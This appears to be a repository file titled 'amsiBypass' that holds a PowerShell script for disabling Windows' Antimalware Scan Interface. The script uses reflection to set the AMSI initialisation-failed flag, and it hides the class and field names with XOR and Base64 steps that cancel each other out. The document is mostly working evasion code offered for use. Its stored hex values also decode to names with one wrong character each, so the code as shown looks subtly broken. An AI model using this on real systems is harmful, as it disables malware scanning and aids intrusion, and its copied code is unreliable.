# amsiBypass

```
# Function to XOR two strings and return the result as a hex string
function XOR-HexStrings {
    param (
        [string]$hexString,
        [string]$key
    )

    $result = @()
    $hexValues = $hexString -split ' '
    $keyValues = $key.ToCharArray()

    for ($i = 0; $i -lt $hexValues.Length; $i++) {
        # Convert hex to byte (character), XOR with key character, and convert back to hex
        $xorResult = [convert]::ToByte($hexValues[$i], 16) -bxor [char]$keyValues[$i % $keyValues.Length]
        $result += '{0:X2}' -f $xorResult  # format as hex
    }

    return $result -join ' '  # Return as string of space-separated hex values
}

# Your XOR key
$xorKey = "1246hhjjjkkgdddd"

# Function to convert hex string to actual string
function HexToString ($hexArray) {
    return ($hexArray -split ' ' | ForEach-Object { [char][convert]::ToInt16($_, 16) }) -join ''
}

# The original hex strings
$originalAdditionalNameHex = "41 6D 73 69 55 74 69 6C 71"
$originalFieldNameHex = "61 6D 73 69 49 6E 69 74 46 61 69 6C 65 61"

# Apply XOR to the original hex strings
$additionalNameHex = XOR-HexStrings -hexString $originalAdditionalNameHex -key $xorKey
$fieldNameHex = XOR-HexStrings -hexString $originalFieldNameHex -key $xorKey

# Decrypting back before using
$decryptedAdditionalNameHex = XOR-HexStrings -hexString $additionalNameHex -key $xorKey
$decryptedFieldNameHex = XOR-HexStrings -hexString $fieldNameHex -key $xorKey

# Construct the class name
$baseName = 'System.Management.Automation.'
$className = $baseName + (HexToString $decryptedAdditionalNameHex)

# Construct the field name
$fieldName = HexToString $decryptedFieldNameHex

# More obfuscation using Base64 encoding/decoding
$base64DecodedName = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($className))))
$base64DecodedField = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($fieldName))))

try {
    # Use reflection to modify the field value
    [Ref].Assembly.GetType($base64DecodedName).GetField($base64DecodedField,'NonPublic,Static').SetValue($null,$true)
    Write-Host "The field was successfully modified."
} catch {
    Write-Host "An error occurred: $_"
}

# Debugging Information
Write-Host "Debugging Information:"
Write-Host "Original Additional Name Hex: $originalAdditionalNameHex"
Write-Host "Original Field Name Hex: $originalFieldNameHex"
Write-Host "XORed Additional Name Hex: $additionalNameHex"
Write-Host "XORed Field Name Hex: $fieldNameHex"
Write-Host "Decrypted Class Name: $className"
Write-Host "Decrypted Field Name: $fieldName"



```

